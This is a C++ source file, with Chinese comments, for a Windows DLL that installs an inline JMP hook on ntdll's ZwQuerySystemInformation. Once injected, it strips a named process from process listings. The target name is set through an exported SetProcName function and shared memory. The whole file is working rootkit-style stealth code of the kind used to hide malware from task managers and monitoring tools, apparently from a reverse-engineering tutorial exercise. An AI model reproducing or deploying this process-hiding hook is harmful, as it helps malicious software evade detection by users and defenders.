// APIHook2.cpp : 定义 DLL 应用程序的导出函数。
//

#include "stdafx.h"
#include <Windows.h>
#include <tchar.h>

#define STATUS_SUCCESS (0x00000000L) 

typedef LONG NTSTATUS;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemBasicInformation = 0,
	SystemPerformanceInformation = 2,
	SystemTimeOfDayInformation = 3,
	SystemProcessInformation = 5,
	SystemProcessorPerformanceInformation = 8,
	SystemInterruptInformation = 23,
	SystemExceptionInformation = 33,
	SystemRegistryQuotaInformation = 37,
	SystemLookasideInformation = 45
} SYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_PROCESS_INFORMATION {
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	BYTE Reserved1[48];
	PVOID Reserved2[3];
	HANDLE UniqueProcessId;
	PVOID Reserved3;
	ULONG HandleCount;
	BYTE Reserved4[4];
	PVOID Reserved5[11];
	SIZE_T PeakPagefileUsage;
	SIZE_T PrivatePageCount;
	LARGE_INTEGER Reserved6[6];
} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;

typedef NTSTATUS (WINAPI *PFZWQUERYSYSTEMINFORMATION)
(SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength);

#define DEF_NTDLL                       ("ntdll.dll")
#define DEF_ZWQUERYSYSTEMINFORMATION    ("ZwQuerySystemInformation")

//创建一个叫做".SHARE"的共享内存节区，然后创建g_szProcName缓冲区
//最后再由导出函数SetprocName()将要隐藏的进程名称保存到g_szProcName中(SetProcName函数在RemoteMain.exe中执行)
#pragma comment(linker,"/SECTION:.SHARE,RWS")
#pragma data_seg(".SHARE")
    TCHAR g_szProcName[MAX_PATH] = { 0, };
#pragma data_seg()


//需要导出的函数SetProcName
#ifdef __cplusplus
	//因为C++编译时会改变函数的名字，那么导出就会出现找不到函数的情况，所以需要用C语言标准
	extern "C" {
#endif // __cplusplus
		__declspec(dllexport) void SetProcName(LPCTSTR szProcName)
		{
			_tcscpy_s(g_szProcName, szProcName);
		}
#ifdef __cplusplus
	}
#endif // __cplusplus

BYTE g_pOrgBytes[5] = { 0, };  



BOOL hook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew, PBYTE pOrgBytes)
{
	FARPROC pfnOrg;
	DWORD dwOldProtect;
	DWORDLONG dwAddress;
	BYTE pBuf[5] = { 0xE9,0, };  
	PBYTE pByte;

	//从ntdll.dll中导出ZwQuerySystemInformation
	pfnOrg = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);
	pByte = (PBYTE)pfnOrg;

	//如果ZwQuerySystemInformation已经被修改，就return
	if (pByte[0] == 0xE9)
		return FALSE;

	//将内存改为可读写
	VirtualProtect((LPVOID)pfnOrg, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);

	//备份原有数据
	memcpy(pOrgBytes, pfnOrg, 5);

	//新的函数地址-HOOK函数地址-5(JMP XXXXXXXX的字节)=相对偏移量
	dwAddress = (DWORDLONG)pfnNew - (DWORDLONG)pfnOrg - 5;

	//将相对偏移量存入pBuf
	memcpy(&pBuf[1], &dwAddress, 4);
	
	//将pBuf(被修改后的代码)写入内存，现在代码已经修改成功了
	memcpy(pfnOrg, pBuf, 5);

    //恢复内存初始权限
	VirtualProtect((LPVOID)pfnOrg, 5, dwOldProtect, &dwOldProtect);

	return TRUE;

}

BOOL unhook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PBYTE pOrgByte)
{
	FARPROC pFunc;
	DWORD dwOldProtect;
	PBYTE pByte;

	pFunc = GetProcAddress(GetModuleHandleA(szDllName), szFuncName);
	pByte = (PBYTE)pFunc;

	if (pByte[0] != 0xE9)
		return FALSE;

	VirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);

	//将备份的数据恢复回内存
	memcpy(pFunc, pOrgByte, 5);

	VirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &dwOldProtect);

	return TRUE;
}


//函数格式与ZwQuerySystemInformation一模一样
NTSTATUS WINAPI NewZwQuerySystemInformation(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength)
{
	NTSTATUS status;
	FARPROC pFunc;
	PSYSTEM_PROCESS_INFORMATION pCur, pPrev;
	char szProcName[MAX_PATH] = { 0, };

	//开始之前先脱钩
	unhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, g_pOrgBytes);

	//通过GetProcAddress调用原始API
	pFunc = GetProcAddress(GetModuleHandleA(DEF_NTDLL), DEF_ZWQUERYSYSTEMINFORMATION);
	status = ((PFZWQUERYSYSTEMINFORMATION)pFunc)(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
	if (status != STATUS_SUCCESS)
		goto __NTQUERYSYSTEMINFORMATION_END;

	//仅针对SystemProcessInformation类型操作
	if (SystemInformationClass == SystemProcessInformation)
	{
		//SYSTEM_PROCESS_INFORMATION类型转换
		//pCur是单向链表的头
		pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;


		//开始遍历链表
		while (TRUE)
		{
			
			if (pCur->Reserved2[1] != NULL)
			{
				//比较进程名字是否是我们的目的进程
				if (!_tcsicmp((PWSTR)pCur->Reserved2[1], g_szProcName))
				{
					//如果是，判断是否位于链表尾部
					//如果在链表尾部，就把前一个节点的Next设为0，直接丢弃掉目的进程的信息
					//如果不是尾部，则需要跳过目的进程，方法是让前一个的Next指向目的进程的后一个进程，而不是指向目的进程
					if (pCur->NextEntryOffset == 0)
						pPrev->NextEntryOffset = 0;
					else
						pPrev->NextEntryOffset += pCur->NextEntryOffset;
				}
				else
					//更新前一个节点
					pPrev = pCur;
			}

			//如果遍历完链表，则退出
			if (pCur->NextEntryOffset == 0)
				break;

			//更新当前节点，得到下一个节点的位置
			pCur = (PSYSTEM_PROCESS_INFORMATION)((ULONGLONG)pCur + pCur->NextEntryOffset);
		}
	}
__NTQUERYSYSTEMINFORMATION_END:
	hook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, (PROC)NewZwQuerySystemInformation, g_pOrgBytes);
	return status;
}



//DLL的入口
BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
	)
{

	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		//放置Hook
		hook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, (PROC)NewZwQuerySystemInformation, g_pOrgBytes);

		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		//卸载Hook
		unhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION,g_pOrgBytes);
		break;
	}
	return TRUE;
}
